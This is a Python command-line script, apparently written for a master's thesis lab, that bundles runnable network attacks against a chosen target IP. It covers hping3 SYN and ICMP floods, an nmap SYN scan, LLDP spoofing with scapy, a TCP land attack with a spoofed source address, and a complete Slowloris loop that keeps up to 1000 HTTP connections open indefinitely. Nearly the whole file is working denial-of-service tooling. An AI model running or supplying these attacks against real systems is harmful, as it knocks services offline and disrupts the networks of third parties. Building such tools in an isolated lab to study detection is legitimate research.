#!/usr/bin/env python3

import subprocess
import argparse
import datetime
import time
import socket
import random
from scapy.all import Ether, sendp
from scapy.layers.l2 import LLDPDU

# Constants for stats
PKTS_CADENCE = 100
PKTS_LEN = 1442
DATA_LEN = 1000000
DATA_STR = 'MB'
INIT_WAIT = 1

# Time tracking
time_init = datetime.datetime.now()

def get_str_time():
    return '[' + (datetime.datetime.now()).strftime('%H:%M:%S') + ']'

def diff():
    return datetime.datetime.now() - time_init

def stats():
    return '[+] Time Elapsed: ' + str(diff()) + '\n' + \
           '[+] Data sent: ' + str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' ' + DATA_STR + '\n'

def syn_flood(target_ip):
    print(f"[+] Launching TCP SYN Flood on {target_ip}:80")
    subprocess.run(["sudo", "hping3", "-S", "-p", "80", "-i", "u1000", "-c", "10000", target_ip])

def icmp_flood(target_ip):
    print(f"[+] Launching ICMP Flood on {target_ip}")
    subprocess.run(["sudo", "hping3", "--icmp", "-i", "u1000", "-c", "5000", target_ip])

def port_scan(target_ip):
    print(f"[+] Performing SYN Port Scan on {target_ip}")
    subprocess.run(["nmap", "-sS", target_ip])

def lldp_spoof(interface):
    print(f"[+] Sending LLDP Spoofing Packet on {interface}")
    pkt = Ether(dst="01:80:c2:00:00:0e") / LLDPDU()
    sendp(pkt, iface=interface, count=1, verbose=False)

def tcp_land_attack(target_ip):
    print(f"[+] Launching TCP Land Attack on {target_ip}")
    subprocess.run(["hping3", "-c", "10000", "-d", "120", "-S", "-w", "64", "-p", "80", "--faster", "-a", target_ip, target_ip])

def slowloris_attack(target_ip):
    print("[+] Starting Slowloris attack (infinite loop, press Ctrl+C to stop)...")
    port = 80
    howmany_sockets = 1000
    headers = [
        "User-agent: Mozilla/5.0",
        "Accept-language: en-US,en,q=0.5",
        "Connection: Keep-Alive"
    ]

    all_sockets = []
    for _ in range(howmany_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(40)
            s.connect((target_ip, port))
            all_sockets.append(s)
        except Exception:
            continue

    while True:
        print(f"[+] Keeping {len(all_sockets)} sockets alive...")
        for s in list(all_sockets):
            try:
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                for header in headers:
                    s.send(f"{header}\r\n".encode("utf-8"))
                s.send("X-a: keep-alive\r\n".encode("utf-8"))
            except Exception:
                all_sockets.remove(s)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(40)
                    s.connect((target_ip, port))
                    all_sockets.append(s)
                except:
                    pass
        time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="Automated Attack Suite for Master's Thesis")
    parser.add_argument("attack", choices=["syn", "icmp", "scan", "lldp", "land", "slowloris"], help="Attack to execute")
    parser.add_argument("--target", type=str, help="Target IP", required=False)
    parser.add_argument("--iface", type=str, default="h1-eth0", help="Interface for LLDP spoofing")

    args = parser.parse_args()

    if args.attack in ["syn", "icmp", "scan", "land", "slowloris"] and not args.target:
        parser.error("--target is required for this attack")

    print(get_str_time(), "[+] Starting attack...")
    time.sleep(INIT_WAIT)

    try:
        if args.attack == "syn":
            syn_flood(args.target)
        elif args.attack == "icmp":
            icmp_flood(args.target)
        elif args.attack == "scan":
            port_scan(args.target)
        elif args.attack == "lldp":
            lldp_spoof(args.iface)
        elif args.attack == "land":
            tcp_land_attack(args.target)
        elif args.attack == "slowloris":
            slowloris_attack(args.target)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    print('\n' + get_str_time(), "[+] Attack finished.")
    print(stats())

if __name__ == "__main__":
    main()

